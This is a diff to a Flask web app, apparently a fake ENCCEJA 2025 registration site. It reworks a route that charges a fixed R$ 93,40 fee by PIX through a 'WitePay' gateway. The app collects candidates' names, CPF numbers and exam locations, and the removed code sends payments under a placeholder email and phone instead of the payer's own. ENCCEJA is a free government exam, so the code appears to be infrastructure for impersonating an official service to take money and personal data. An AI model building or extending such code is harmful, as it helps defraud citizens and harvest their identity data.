@@ -1651,7 +1651,7 @@ def local_prova():
             'estado_prova': request.form.get('estado_prova', '')
         })
         session['user_data'] = user_data
-        return redirect(url_for('pagamento_encceja'))
+        return redirect(url_for('pagamento'))
     
     return render_template('local_prova.html', user_data=user_data)
 
@@ -1671,64 +1671,69 @@ def encceja_info():
     
     return render_template('encceja_info.html', user_data=user_data)
 
-@app.route('/pagamento', methods=['GET', 'POST'])
-def pagamento_encceja():
-    """Página de pagamento da taxa do Encceja usando WitePay"""
-    if request.method == 'POST':
-        # Obter dados do usuário
-        data = request.get_json()
-        nome = data.get('nome')
-        cpf = data.get('cpf')
-        telefone = data.get('telefone')
-        
-        if not nome or not cpf:
-            return jsonify({'error': 'Dados obrigatórios não fornecidos'}), 400
-        
-        try:
-            # Usar o novo gateway WitePay
-            from witepay_gateway import create_witepay_gateway
-            payment_gateway = create_witepay_gateway()
-            
-            # Preparar dados do usuário para WitePay
-            user_data = {
-                'nome': nome,
-                'cpf': cpf,
-                'amount': 93.40,  # Valor em reais conforme especificado
-                'email': 'gerarpagamentos@gmail.com',  # Email padrão
-                'phone': '11987790088'  # Telefone padrão
-            }
-            
-            app.logger.info(f"[WITEPAY] Criando pagamento para: {nome} ({cpf}) - R$ 93,40")
-            
-            # Criar pagamento completo (order + charge)
-            payment_result = payment_gateway.create_complete_pix_payment(user_data)
-            
-            if payment_result.get('success'):
-                # Formatar resposta para compatibilidade com o frontend
-                response_data = {
-                    'id': payment_result.get('id'),
-                    'pixCode': payment_result.get('pixCode'),
-                    'pixQrCode': payment_result.get('pixQrCode'),
-                    'pix_code': payment_result.get('pixCode'),  # Compatibilidade com frontend
-                    'qr_code': payment_result.get('pixQrCode'),  # Compatibilidade com frontend
-                    'expiresAt': payment_result.get('expiresAt'),
-                    'status': payment_result.get('status', 'pending'),
-                    'orderId': payment_result.get('orderId')
-                }
-                
-                app.logger.info(f"[WITEPAY] Pagamento criado com sucesso - ID: {response_data.get('id')}")
-                return jsonify(response_data)
-            else:
-                error_msg = payment_result.get('error', 'Erro desconhecido')
-                app.logger.error(f"[WITEPAY] Erro ao criar pagamento: {error_msg}")
-                return jsonify({'error': error_msg}), 500
-            
-        except Exception as e:
-            app.logger.error(f"[WITEPAY] Erro inesperado ao criar pagamento: {str(e)}")
-            return jsonify({'error': f'Erro interno: {str(e)}'}), 500
+@app.route('/pagamento')
+def pagamento():
+    """Página de pagamento PIX"""
+    user_data = session.get('user_data', {})
     
-    # Para requisições GET, renderizar a página de pagamento
-    return render_template('pagamento.html')
+    if not user_data.get('cpf'):
+        return redirect(url_for('inscricao'))
+    
+    return render_template('pagamento.html', user_data=user_data)
+
+@app.route('/criar-pagamento-pix', methods=['POST'])
+def criar_pagamento_pix():
+    """Criar pagamento PIX via WitePay - Versão compatível VPS/Replit"""
+    try:
+        # Valor fixo do ENCCEJA
+        amount = 93.40
+        description = "Inscrição ENCCEJA 2025"
+        
+        app.logger.info(f"Iniciando criação de pagamento PIX - R$ {amount:.2f}")
+        
+        # Importar função do gateway
+        from VPS_WITEPAY_CORRIGIDO import create_witepay_payment
+        
+        # Criar pagamento
+        result = create_witepay_payment(amount, description)
+        
+        if result.get('success'):
+            # Salvar dados do pagamento na sessão
+            session['payment_data'] = result
+            
+            app.logger.info(f"Pagamento PIX criado com sucesso - ID: {result.get('transaction_id')}")
+            
+            return jsonify({
+                'success': True,
+                'id': result.get('transaction_id'),
+                'pixCode': result.get('pix_code'),
+                'pixQrCode': result.get('qr_code'),
+                'pix_code': result.get('pix_code'),  # Compatibilidade
+                'qr_code': result.get('qr_code'),   # Compatibilidade
+                'amount': result.get('amount'),
+                'orderId': result.get('order_id'),
+                'status': 'pending'
+            })
+        else:
+            error_msg = result.get('error', 'Erro desconhecido')
+            app.logger.error(f"Erro ao criar pagamento PIX: {error_msg}")
+            return jsonify({
+                'success': False,
+                'error': error_msg
+            }), 400
+    
+    except ImportError as e:
+        app.logger.error(f"Erro ao importar gateway: {e}")
+        return jsonify({
+            'success': False,
+            'error': 'Gateway de pagamento não disponível'
+        }), 500
+    except Exception as e:
+        app.logger.error(f"Erro inesperado ao criar pagamento: {e}")
+        return jsonify({
+            'success': False,
+            'error': f'Erro interno: {str(e)}'
+        }), 500
 
 @app.route('/consultar-cpf')
 def consultar_cpf():
